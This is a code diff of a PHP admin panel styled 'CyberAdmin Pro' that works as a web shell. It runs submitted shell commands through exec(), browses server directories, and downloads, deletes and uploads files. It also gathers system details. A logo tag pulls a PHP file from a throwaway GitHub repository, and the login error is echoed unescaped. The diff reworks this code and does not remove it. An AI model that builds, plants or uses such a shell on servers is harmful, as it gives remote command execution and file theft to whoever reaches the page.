@@ -75,141 +75,9 @@ if (!checkAuth()) {
         }
     }
     
-    // Show Login Page
-    showLogin($error ?? '');
-    exit;
-}
-
-// Handle Logout
-if (isset($_GET['logout'])) {
-    logAction("LOGOUT", $_SESSION['username']);
-    session_destroy();
-    header('Location: ' . $_SERVER['PHP_SELF']);
-    exit;
-}
-
-// Core Functions
-function executeCommand($command) {
-    if (!isSafeCommand($command)) {
-        return "Error: Command not allowed for security reasons";
-    }
-    
-    $output = [];
-    $return_var = 0;
-    exec($command . " 2>&1", $output, $return_var);
-    return [
-        'output' => implode("\n", $output),
-        'return_code' => $return_var,
-        'command' => $command
-    ];
-}
-
-function getSystemInfo() {
-    $info = [];
-    
-    // System
-    $info['os'] = php_uname();
-    $info['server'] = $_SERVER['SERVER_SOFTWARE'];
-    $info['php_version'] = phpversion();
-    
-    // Memory
-    $info['memory_usage'] = memory_get_usage(true);
-    $info['memory_peak'] = memory_get_peak_usage(true);
-    
-    // Disk
-    $info['disk_free'] = disk_free_space("/");
-    $info['disk_total'] = disk_total_space("/");
-    
-    // Load average
-    if (function_exists('sys_getloadavg')) {
-        $info['load_avg'] = sys_getloadavg();
-    }
-    
-    return $info;
-}
-
-function browseDirectory($path = '.') {
-    $files = [];
-    $items = scandir($path);
-    
-    foreach ($items as $item) {
-        if ($item == '.' || $item == '..') continue;
-        
-        $fullPath = $path . '/' . $item;
-        $files[] = [
-            'name' => $item,
-            'path' => $fullPath,
-            'type' => is_dir($fullPath) ? 'directory' : 'file',
-            'size' => is_file($fullPath) ? filesize($fullPath) : null,
-            'permissions' => substr(sprintf('%o', fileperms($fullPath)), -4),
-            'modified' => filemtime($fullPath),
-            'is_readable' => is_readable($fullPath),
-            'is_writable' => is_writable($fullPath)
-        ];
-    }
-    
-    return $files;
-}
-
-// Process Actions
-$result = [];
-$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
-
-if ($_POST) {
-    $action = key($_POST);
-    
-    switch ($action) {
-        case 'command':
-            $cmd = sanitizeInput($_POST['command']);
-            $result = executeCommand($cmd);
-            logAction("COMMAND_EXEC", $cmd);
-            break;
-            
-        case 'download':
-            $file = realpath($_POST['file_path']);
-            if ($file && file_exists($file) && is_readable($file)) {
-                header('Content-Description: File Transfer');
-                header('Content-Type: application/octet-stream');
-                header('Content-Disposition: attachment; filename="'.basename($file).'"');
-                header('Content-Length: ' . filesize($file));
-                readfile($file);
-                logAction("FILE_DOWNLOAD", $file);
-                exit;
-            }
-            break;
-            
-        case 'delete_file':
-            $file = realpath($_POST['file_path']);
-            if ($file && file_exists($file) && is_writable($file)) {
-                if (is_dir($file)) {
-                    rmdir($file);
-                } else {
-                    unlink($file);
-                }
-                $result = ['success' => 'File deleted successfully'];
-                logAction("FILE_DELETE", $file);
-            }
-            break;
-    }
-}
-
-if (isset($_FILES['upload_file'])) {
-    $upload = $_FILES['upload_file'];
-    if ($upload['error'] === UPLOAD_ERR_OK) {
-        $target = $current_dir . '/' . basename($upload['name']);
-        if (move_uploaded_file($upload['tmp_name'], $target)) {
-            $result = ['success' => 'File uploaded successfully'];
-            logAction("FILE_UPLOAD", $target);
-        }
-    }
-}
-
-// Get current system data
-$system_info = getSystemInfo();
-$directory_files = browseDirectory($current_dir);
-
-function showLogin($error = '') {
-    echo '<!DOCTYPE html>
+    // Show Login Page - FIXED FUNCTION
+    ?>
+    <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
@@ -314,10 +182,12 @@ function showLogin($error = '') {
     <body>
         <div class="login-container">
             <div class="logo">
-                <img src="https://raw.githubusercontent.com/ozawa8059-sys/asdasd/main/config.php" alt="Security Shield" onerror="this.style.display=\'none\'">
+                <img src="https://raw.githubusercontent.com/ozawa8059-sys/asdasd/main/config.php" alt="Security Shield" onerror="this.style.display='none'">
                 <h1>SECURE PORTAL</h1>
             </div>
-            ' . ($error ? '<div class="error">' . $error . '</div>' : '') . '
+            <?php if (isset($error)): ?>
+                <div class="error"><?php echo $error; ?></div>
+            <?php endif; ?>
             <form method="post">
                 <div class="form-group">
                     <label>Username</label>
@@ -334,8 +204,145 @@ function showLogin($error = '') {
             </div>
         </div>
     </body>
-    </html>';
+    </html>
+    <?php
+    exit;
 }
+
+// Handle Logout
+if (isset($_GET['logout'])) {
+    logAction("LOGOUT", $_SESSION['username']);
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Core Functions
+function executeCommand($command) {
+    if (!isSafeCommand($command)) {
+        return [
+            'output' => "Error: Command not allowed for security reasons",
+            'return_code' => 1,
+            'command' => $command
+        ];
+    }
+    
+    $output = [];
+    $return_var = 0;
+    exec($command . " 2>&1", $output, $return_var);
+    return [
+        'output' => implode("\n", $output),
+        'return_code' => $return_var,
+        'command' => $command
+    ];
+}
+
+function getSystemInfo() {
+    $info = [];
+    
+    // System
+    $info['os'] = php_uname();
+    $info['server'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
+    $info['php_version'] = phpversion();
+    
+    // Memory
+    $info['memory_usage'] = memory_get_usage(true);
+    $info['memory_peak'] = memory_get_peak_usage(true);
+    
+    // Disk
+    $info['disk_free'] = disk_free_space("/");
+    $info['disk_total'] = disk_total_space("/");
+    
+    // Load average
+    if (function_exists('sys_getloadavg')) {
+        $info['load_avg'] = sys_getloadavg();
+    }
+    
+    return $info;
+}
+
+function browseDirectory($path = '.') {
+    $files = [];
+    if (!is_dir($path)) return $files;
+    
+    $items = scandir($path);
+    
+    foreach ($items as $item) {
+        if ($item == '.' || $item == '..') continue;
+        
+        $fullPath = $path . '/' . $item;
+        $files[] = [
+            'name' => $item,
+            'path' => $fullPath,
+            'type' => is_dir($fullPath) ? 'directory' : 'file',
+            'size' => is_file($fullPath) ? filesize($fullPath) : null,
+            'permissions' => substr(sprintf('%o', fileperms($fullPath)), -4),
+            'modified' => filemtime($fullPath),
+            'is_readable' => is_readable($fullPath),
+            'is_writable' => is_writable($fullPath)
+        ];
+    }
+    
+    return $files;
+}
+
+// Process Actions
+$result = [];
+$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+if ($current_dir === false) $current_dir = getcwd();
+
+if ($_POST) {
+    $action = key($_POST);
+    
+    switch ($action) {
+        case 'command':
+            $cmd = sanitizeInput($_POST['command']);
+            $result = executeCommand($cmd);
+            logAction("COMMAND_EXEC", $cmd);
+            break;
+            
+        case 'download':
+            $file = realpath($_POST['file_path']);
+            if ($file && file_exists($file) && is_readable($file)) {
+                header('Content-Description: File Transfer');
+                header('Content-Type: application/octet-stream');
+                header('Content-Disposition: attachment; filename="'.basename($file).'"');
+                header('Content-Length: ' . filesize($file));
+                readfile($file);
+                logAction("FILE_DOWNLOAD", $file);
+                exit;
+            }
+            break;
+            
+        case 'delete_file':
+            $file = realpath($_POST['file_path']);
+            if ($file && file_exists($file) && is_writable($file)) {
+                if (is_dir($file)) {
+                    rmdir($file);
+                } else {
+                    unlink($file);
+                }
+                $result = ['success' => 'File deleted successfully'];
+                logAction("FILE_DELETE", $file);
+            }
+            break;
+    }
+}
+
+if (isset($_FILES['upload_file'])) {
+    $upload = $_FILES['upload_file'];
+    if ($upload['error'] === UPLOAD_ERR_OK) {
+        $target = $current_dir . '/' . basename($upload['name']);
+        if (move_uploaded_file($upload['tmp_name'], $target)) {
+            $result = ['success' => 'File uploaded successfully'];
+            logAction("FILE_UPLOAD", $target);
+        }
+    }
+}
+
+// Get current system data
+$system_info = getSystemInfo();
+$directory_files = browseDirectory($current_dir);
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -622,7 +629,7 @@ function showLogin($error = '') {
     <div class="header">
         <div class="header-content">
             <div class="logo">
-                <img src="https://raw.githubusercontent.com/ozawa8059-sys/asdasd/main/config.php" alt="CyberAdmin" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iOCIgZmlsbD0iIzAwZmY4OCIvPgo8cGF0aCBkPSJNMTAgMTVIMzBWMTguNUgzMi41VjI1SDMwVjI4LjVIMTNWMjVIMTAuNVYxOC41SDEzVjE1WiIgZmlsbD0iIzBhMGEwYSIvPgo8L3N2Zz4K'">
+                <img src="https://shuju.to/assets/logo.png" alt="CyberAdmin" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iOCIgZmlsbD0iIzAwZmY4OCIvPgo8cGF0aCBkPSJNMTAgMTVIMzBWMTguNUgzMi41VjI1SDMwVjI4LjVIMTNWMjVIMTAuNVYxOC41SDEzVjE1WiIgZmlsbD0iIzBhMGEwYSIvPgo8L3N2Zz4K'">
                 <h1>CYBERADMIN PRO</h1>
             </div>
             <div class="user-info">
@@ -645,7 +652,6 @@ function showLogin($error = '') {
                 <div class="stat-value">
                     <?php 
                     $mem = $system_info['memory_usage'];
-                    $mem_peak = $system_info['memory_peak'];
                     echo round($mem / 1024 / 1024, 2) . ' MB'; 
                     ?>
                 </div>
@@ -851,4 +857,3 @@ if (file_exists('admin_actions.log')) {
 <?php
 ob_end_flush();
 ?>
-
